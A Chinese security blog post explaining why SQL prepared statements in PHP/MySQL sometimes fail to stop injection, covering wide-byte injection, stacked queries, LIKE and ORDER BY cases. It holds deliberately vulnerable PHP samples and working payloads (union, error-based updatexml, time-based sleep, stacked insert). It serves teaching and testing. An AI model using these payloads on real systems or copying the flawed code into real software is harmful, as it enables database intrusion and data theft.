SQL注入&amp;预编译
=============

这篇文章来源于被预编译搞的头疼，捡垃圾的我只是想捡个注入，然鹅随着使用预编译的广泛使用，让我这个捡垃圾的捡不到注入了。但听说预编译防止不了排序处的注入，于是乎想自己看一下，然后就又能多个捡垃圾的路子了。多捡点垃圾的话晚上就能加个蛋了Q\_A\_Q

拼接
--

很久很久以前，用户的传参是能够直接拼接到sql的查询语句中去，例如：

```php
// index.php
<?php
$username = $_POST['username'];
mysqli_select_db($conn,sort) or die ( "Unable to connect to the database: test");   
# 选择数据库

$sql = "select fraction from fraction where name = '$username';";  # 直接将用户输入拼接进字符串
$result = mysqli_query($conn,$sql);
echo '<br/>'.$sql.'<br/>';  # 打印sql语句

if($fraction = mysqli_fetch_assoc( $result )){
    echo '查询成功';
}
else{
    mysqli_error($conn);
}

echo '<br/>';
echo '学生:'.$username;
echo '<br/>';
echo '分数:'.$fraction['fraction'];

$conn->close();
?>
```

这里构建了一个简单的查询分数的功能，可以看到直接将用户的输入带入到了sql语句中，这sql注入很明显了

![2.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-baa636b9b21ac70f7f50e3ab143ad7a6accf6fff.png)

这里可以直接构造payload来实现注入  
payload:`1'union select database();#`

![3.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c1d9b531926e2adb27fcc9345304eb657c72db8e.png)

这种情况下，如果做安全防护的话，也只能是从效验用户的输入入手了，但是效验规则大概率都能进行绕过，只不过是绕的难易不一样罢了。但是现在已经进入到了预编译的时代，拼接的情况虽然有，但较少了，再加上防护设备的广泛应用，使得捡个注入越来越难了。

预编译
---

据听说，预编译一开始是为了提高MySQL的运行效率而诞生，但是由于其先构建语法树，后带入查询参数的特性导致其具有了防止SQL注入的特性。这里简单说一下MySQL的预处理语句的使用，以及防止SQL的注入的原因(因为其他数据库一点不会)

### MySQL预编译

MySQL预编译执行分为三步：  
1.执行预编译语句，构建语法树，例如：

```mysql
prepare sel from "select fraction from fraction where name = ?";
# 使用PREPARE stmt_name FROM preparable_stm语法
# stmt_name是语句名，preparable_stm是具体要执行的语句，变量先由 ？ 进行占位
```

2.设置变量，例如：

```mysql
set @a='mechoy';
```

3.执行，将设置的变量代入到已经构建好的语句中进行执行

```mysql
execute sel using @a;
# 使用EXECUTE stmt_name [USING @var_name [, @var_name] ...]语法
# 变量位置与占位符一一对应
```

执行结束后查看数据库日志：

![4.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5a05811260d01044f72856fcfdc5e30d3f3e3c49.png)

可以看到在使用预处理语句时，数据库共进行了四步操作：1.构建预处理语句；2.设置变量；3.绑定变量；4.执行查询

预编译的优势在于其不用每一次都构建语法树，以上面为例，当有`@b='admin'`时，执行`execute sel using @b;`时，数据库会直接去fraction表中查询`name=admin`的fraction值，而不用再一次构建语法树，这可能也就是预编译语句为何能提高MySQL效率的原因

而预编译语句在防止SQL注入上，看下面这张图：

![5.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2b50533c15ae52462e8782c4093bb90b3e443a5b.png)

在@b和@c的情况下返回都为空，也就是将@b和@c的值只是当做一个变量，去寻找name字段中与其相同的  
如果在数据库中插入一条`name=xx union select database()`数据，再次执行就会获得相应的值

![6.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-cb5b335653d2964705caa378fef3edbe205f1568.png)

再执行就会得到如下结果

```mysql
mysql> execute sel using @c;
+----------+
| fraction |
+----------+
|      100 |
+----------+
```

所以这里变量只是一个变量，只是用来比较name字段中是否存在相同的值，存在则返回fraction的值，不存在则返回空，这就是预编译为什么能防止SQL注入的原因。

### PHP+MySQL 预处理语句

在使用PHP编写预处理语句时，会遇到预编译和模拟预编译(这里先提一下)  
PHP中连接MySQL数据库目前两种较为常见的方法：

- Mysqli
- PDO  
    这里先说一下使用Mysqli的预编译语句进行数据的查询

#### Mysqli

`Mysqli`扩展允许我们访问MySQL 4.1及以上版本提供的功能。  
使用PHP的Mysqli实现预编译如下：

```php
# index1.php
# $conn为与mysql数据库建立的链接，同时选择
<?php
$username = $_POST['username'];

# $stmt = $conn->prepare("select fraction from fraction where name = ?");   预处理以及绑定
$stmt = mysqli_stmt_init($conn);    # 分配并初始化一个语句对象用于mysqli_stmt_prepare()。
mysqli_stmt_prepare($stmt,"select fraction from fraction where name = ?");  # 预处理
mysqli_stmt_bind_param($stmt,"s", $username);   # 绑定

# $stmt->execute(); # 执行
mysqli_stmt_execute($stmt);
mysqli_stmt_bind_result($stmt,$fraction);   # 将查询结果绑定至$fraction

if(mysqli_stmt_fetch($stmt)){
    echo '查询成功';
    echo '<br/>';
    echo '学生:'.$username;
    echo '<br/>';
    # echo '分数:'.$fraction;
    print("分数: ".$fraction."\n");
}
else{
    mysqli_stmt_errno($stmt);
}

$conn->close();
?>
```

执行查询`name="mechoy"`，查看数据库日志：

```mysql
Connect root@localhost on sort using TCP/IP
Prepare select fraction from fraction where name = ?
Execute select fraction from fraction where name = 'mechoy'
# 可以看到这里共分成了三步：1.建立连接；2.构建语法树；3.执行
```

这里看起来跟MySQL的预处理语句基本相同，只不过因为这里少了设置变量和将变量绑定进预编译的两步。

执行查询`name="mechoy' union select database();#"`

```mysql
4 Connect   root@localhost on sort using TCP/IP
4 Prepare   select fraction from fraction where name = ?
4 Execute   select fraction from fraction where name = 'mechoy\' union select database();#'
```

发现这里输入的单引号被转义了，预编译+转义，好像跟SQL注入说再见了，对于我这个只会Sqlmap一把梭的人，好像跟全世界再见了

#### PDO

- PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。
- PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。
- PDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。  
    使用PDO实现预编译如下：

```php
# index2.php
<?php
$username = $_POST['username']; // 接收username
# 建立数据库连接
header("Content-Type:text/html;charset=utf-8");
$dbs = "mysql:host=127.0.0.1;dbname=sort";
$dbname = "root";
$passwd = "root";
// 创建连接,选择数据库,检测连接
try{
    $conn = new PDO($dbs, $dbname, $passwd);
    echo "连接成功<br/>";
}
catch (PDOException $e){
    die ("Error!: " . $e->getMessage() . "<br/>");
}
# 设置预编译语句，绑定参数，这里使用命名占位符
$stmt = $conn->prepare("select fraction from fraction where name = :username");
$stmt->bindParam(":username",$username);
$stmt->execute();
if($fraction = $stmt->fetch(PDO::FETCH_ASSOC)){
    echo '查询成功';
    echo '<br/>';
    echo '学生:'.$username;
    echo '<br/>';
    # echo '分数:'.$fraction;
    print_r("分数".$fraction[fraction]);
}
else{
}
$conn=null; # 关闭链接
?>
```

执行查询`name="mechoy"`，查看数据库日志：

```mysql
27 Connect  root@localhost on sort using TCP/IP         # 建立连接
27 Query    select fraction from fraction where name = 'mechoy' # 执行查询
27 Quit                                 # 结束
```

从日志来看，没有prepare和execute，只是执行了一个查询的SQL语句，并没有进行预编译。显然，PDO默认情况下使用的是模拟预编译。

> 模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本MySQL)。如果模拟预处理开启，那么客户端程序内部会模拟MySQL数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给MySQL数据库执行。

而想要真正使用预编译，首先需要数据库支持预编译，再在代码中加入

```php
$conn -> setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
# bool PDO::setAttribute ( int $attribute , mixed  $value ) 设置数据库句柄属性。
# PDO::ATTR_EMULATE_PREPARES 启用或禁用预处理语句的模拟。 有些驱动不支持或有限度地支持本地预处理。使用此设置强制PDO总是模拟预处理语句（如果为 TRUE  ），或试着使用本地预处理语句（如果为 FALSE ）。如果驱动不能成功预处理当前查询，它将总是回到模拟预处理语句上。需要 bool  类型。 
#这里在PHP5.2.17时无效，暂未找到原因
#更改版本为PHP5.6.9时生效
```

再执行查询`name="mechoy"`，查看数据库日志：

```mysql
4 Connect   root@localhost on sort using TCP/IP
4 Prepare   select fraction from fraction where name = ?
4 Execute   select fraction from fraction where name = 'mechoy'
4 Close     stmt    
4 Quit
# 可以看到当PDO::ATTR_EMULATE_PREPARES设置为false时，取消了模拟预处理，采用本地预处理
```

预编译所不能防范的注入
-----------

### PDO模拟预处理+宽字节

模拟代码如下：

```php
# index3.php
<?php
// PHP5.2.17+MySQL5.7.26+Apache2.4.39环境下
// PHP5.6.9时无法实现
$username = $_GET['username']; // 接收username
# 建立数据库连接
$dbs = "mysql:host=127.0.0.1;dbname=sort1;charset=gbk"; // 设置数据库字符编码
$dbname = "root";
$passwd = "root";
// 创建连接,选择数据库,检测连接
try{
$conn = new PDO($dbs, $dbname, $passwd);
echo "Sucussful<br/>";
}
catch (PDOException $e){
die ("Error!: " . $e->getMessage() . "<br/>");
}
# 设置模拟预编译语句，绑定参数，这里使用命名占位符
$conn->query('SET NAMES GBK');
$stmt = $conn->prepare("select fraction from fraction where name = :username");
$stmt->bindParam(":username",$username);
$stmt->execute();
$fraction = $stmt->fetch();
var_dump($fraction);
$conn=null; # 关闭链接
?>
```

当传入`username="1' union select database();#"`时，看数据库日志：

```mysql
28 Connect  root@localhost on sort using TCP/IP
28 Query    select fraction from fraction where name = 'mechoy\' union select database()#'      
28 Quit 
# 将单引号进行转义
```

> 模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。

当传入`1%df%27%20union%20select%20database();#`时，再查看数据库日志

```mysql
15 Connect  root@localhost on sort1 using TCP/IP
15 Query    SET NAMES GBK
15 Query    select fraction from fraction where name = '1運' union select database();
//可以看到成功利用%df吃掉斜杠，造成宽字节注入
```

![9.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0a7a6b444527aaae7cf0a14432b56317a16a09a1.png)

### PDO的错误使用

一些稍微欠缺经验的开发人员，可能会错误的使用PDO，如下：

```php
// index4.php
<?php
$username = $_GET['username']; // 接收username
# 建立数据库连接
$dbs = "mysql:host=127.0.0.1;dbname=sort1";
$dbname = "root";
$passwd = "root";
// 创建连接,选择数据库,检测连接
try{
$conn = new PDO($dbs, $dbname, $passwd);
echo "Sucussful<br/>";
}
catch (PDOException $e){
die ("Error!: " . $e->getMessage() . "<br/>");
}
# 感觉用了预编译语句，但又好像没完全用
$stmt = $conn->prepare("select fraction from fraction where name = '$username'");
$stmt->execute();
$fraction = $stmt->fetch();
var_dump($fraction);
$conn=null; # 关闭链接
?>
```

这种看似用了prepare进行预处理，但没有关键性的占位符、参数绑定，所以等同于直接拼接

### PDO中的多条执行

PDO有一个有趣的特性：默认可以支持多条SQL执行。这就造成了堆叠注入的可能，如下例子：

```mysql
<?php
$id= $_GET['id']; // 接收username

# 建立数据库连接
$dbs = "mysql:host=127.0.0.1;dbname=sort";
$dbname = "root";
$passwd = "root";

// 创建连接,选择数据库,检测连接
try{
$conn = new PDO($dbs, $dbname, $passwd);
echo "Sucussful<br/>";
}
catch (PDOException $e){
die ("Error!: " . $e->getMessage() . "<br/>");
}

# 预处理语句
$stmt = $conn->prepare("select fraction from fraction where id=$id");
$stmt->execute();
$fraction = $stmt->fetch();
print_r($fraction[fraction]);

$conn=null; # 关闭链接
?>
```

当输入`id=1;select%20database()`时，查看数据库日志

```mysql
5 Connect   root@localhost on sort using TCP/IP
5 Query select fraction from fraction where id=1;
5 Query select database()
# 数据库执行了两条查询语句
```

但这样有个问题是，回显位置只有1个，无法回显出第二条查询语句的结果，但可以通过先将内容插入到数据库中，然后再通过查询做出来  
先执行：`?id=1;insert into fraction(id,name,fraction) values(111,database(),user())`  
查看数据库日志以及数据库是否插入内容

```mysql
10 Connect  root@localhost on sort using TCP/IP
10 Query    select fraction from fraction where id=1;
10 Query    insert into fraction(id,name,fraction) values(111,database(),user())
# 可以看到执行了两条语句
```

![10.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5e809c04c96b5b11437e409da5d6dc82086c8107.png)

再执行：`id=111`，能够看到成功查询，但有个问题是当回显位置的值是有个数字型时，就无法直接将我们想要获取的内容存入到数据库的相应字段中了，但好像也有办法，可以尝试一下

![11.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-bdd4b1812935109505ff0635f14228a036cb420f.png)

### 预编译不生效

不是所有的地方都能使用预编译语句，有些位置可能会存在使用预编译之后，sql语句不生效，而这些位置又不得不使用拼接。

#### like位置

```php
index6.php
<?php
$username = $_GET['username']; // 接收username
# 建立数据库连接
$dbs = "mysql:host=127.0.0.1;dbname=sort";
$dbname = "root";
$passwd = "root";
// 创建连接,选择数据库,检测连接
try{
$conn = new PDO($dbs, $dbname, $passwd);
echo "Sucussful<br/>";
}
catch (PDOException $e){
die ("Error!: " . $e->getMessage() . "<br/>");
}
# 预编译语句
$conn -> setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$stmt = $conn->prepare("select * from fraction where name like '%:username%'");
$stmt->bindParam(":username",$username);
$stmt->execute();
$fraction = $stmt->fetchAll(PDO::FETCH_ASSOC);
print_r($fraction);
$conn=null; # 关闭链接
?>
```

传入：`username=t`，查看数据库日志

```mysql
21 Connect  root@localhost on sort using TCP/IP
21 Prepare  select * from fraction where name like '%:username%'
21 Execute  select * from fraction where name like '%:username%'
21 Close stmt   
21 Quit 
```

发现这里没有把我们传的`username=t`绑定到查询语句中去，这是因为在绑定参数时包含％,而不是在SQL本身(预先准备好的语句)中,这是不起作用。所以这种情况下，开发可能会选择直接使用拼接语句，这就给了SQL注入的可能。  
但是，也不是没有办法在使用like的情况下进行预编译，需要调用一些，MySQL的内置函数，例如将上述的查询语句更改为如下形式：

```mysql
select * from fraction where name like concat('%',:username,'%')
# 这种情况下就能够进行在使用预编译的情况下进行like模糊查询
```

#### order by 简单用法

**作用**：用于对结果集进行排序。

**语法：**顺序：SELECT  *from 表名 ORDER BY 排序的字段名 倒序：SELECT*  from 表名 ORDER BY 排序的字段名 DESC

```mysql
[ORDER BY {col_name | expr | position}  
[ASC | DESC], ...]  
```

**注**：ORDER BY 语句用于根据指定的列对结果集进行排序。ORDER BY 语句默认按照升序对记录进行排序。

```mysql
select * from fraction order by fraction DESC;  # 根据字段fraction进行降序排列
select * from fraction order by fraction ASC;   # 根据字段fraction进行升序排列
```

`order by`位置的注入点，其实跟平常的注入点类似，目前感觉区别不大，例如：

```mysql
select * from fraction order by 1 and 1=updatexml(0,concat('~',user(),'~'),1)# asc; -- 报错注入
select * from fraction order by updatexml(0,concat('~',user(),'~'),1)# asc;         -- 报错注入
select * from fraction order by if(1,sleep(3),sleep(0))# asc;   -- 延时盲注，但这个延时了33秒，离谱
select * from fraction order by if((user()='root@localhost'),fraction,id);# asc;    -- 布尔盲注
```

#### order by后传入字段名

ok，回归正题，有时ORDER BY后的表名动态传入的SQL语句；渗透测试中允许用户传入按某个字段进行排序的行为，这很有可能是直接拼接的。

```php
<?php
$col = $_GET['col']; // 接收username
# 建立数据库连接
$dbs = "mysql:host=127.0.0.1;dbname=sort";
$dbname = "root";
$passwd = "root";
// 创建连接,选择数据库,检测连接
try{
$conn = new PDO($dbs, $dbname, $passwd);
echo "Sucussful<br/>";
}
catch (PDOException $e){
die ("Error!: " . $e->getMessage() . "<br/>");
}
# 设置本地预编译，绑定参数
$conn -> setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$stmt = $conn->prepare("select * from fraction order by :col");
$stmt->bindParam(":col",$col);
$stmt->execute();
$result = $stmt->fetchAll(PDO::FETCH_ASSOC);
print_r($result);

$conn=null; # 关闭链接
?>
```

传入`col=fraction`，查看数据库执行日志，能够发现已经成功绑定参数。

```mysql
12 Connect  root@localhost on sort using TCP/IP
12 Prepare  select * from fraction order by ?
12 Execute  select * from fraction order by 'fraction'
12 Close stmt   
12 Quit
```

但把执行的语句代入数据库命令行中再看，发现这结果不是我们想要的啊

![12.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-363db99964088dfe4bc9e660b3cb6cbc4e4c8c7c.png)

这是因为在进行参数绑定的时候，$col的值是一个字符串，在将$col的值绑定进sql语句中后，:col仍然是一个字符串，最终代入数据库进行执行的语句是`select * from fraction order by 'fraction'`，而order by之后需要的是一个表名，这个表名不能以字符串的形式存在。因此，该位置大概率会被写成拼接，这就造成了SQL注入的可能。

#### order by后传入ASC/DESC

有时，可能会存在根据用户的选择来进行正序或倒叙排列，而这时如果`ASC/DESC`是从前端动态传入的，那此处大概率使用的是拼接  
举例：

```php
$stmt = $conn->prepare("select * from fraction order by fraction :asc");
```

当使用PDO，将预处理语句写成这样时，会抛出错误

![13.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d84172beb4ba14cd558f263ab333bd5956ee1e64.png)

在MySQL命令行中，进行该预处理语句

```mysql
prepare sel from "select * from fraction order by fraction ?";
```

同样会抛出错误  
`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?' at line 1`  
所以当需要前端传入`ASC/DESC`时，后端大概率使用的是拼接，用了拼接就造成了SQL注入的可能

### 最后的最后

目前所了解到的基本上就这些，看网上说还有"IN 语句之后"，但是经过测试之后发现`IN`语句之后能够正常使用预处理，`IN`语句之后若存在SQL注入的话大概率就是拼接，而拼接的话就跟普通的注入区别不大了，所以就没有写关于`IN`语句之后的。文章里面估计有一些错误的地方，以及一些没有说清的地方，后面翻看的时候如果发现了就再更新，毕竟现在菜的离谱，写错了也不知道错了；还有就是肯定有一些不能使用预编译或预编译可能存在的问题没有写到，后面如果学习到或者遇到的时候要补充进来的。最后的最后，该去想办法捡点垃圾吃晚饭了

![14.jpg](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-83b016d616b71c9b7973b0249f2b430ec9d2d5f8.jpg)

### 参考链接：

<https://www.cnblogs.com/Cyangsec/p/13067369.html>  
<https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11f>  
<https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be>  
<https://cloud.tencent.com/developer/news/378220>  
<https://xz.aliyun.com/t/7132#toc-11>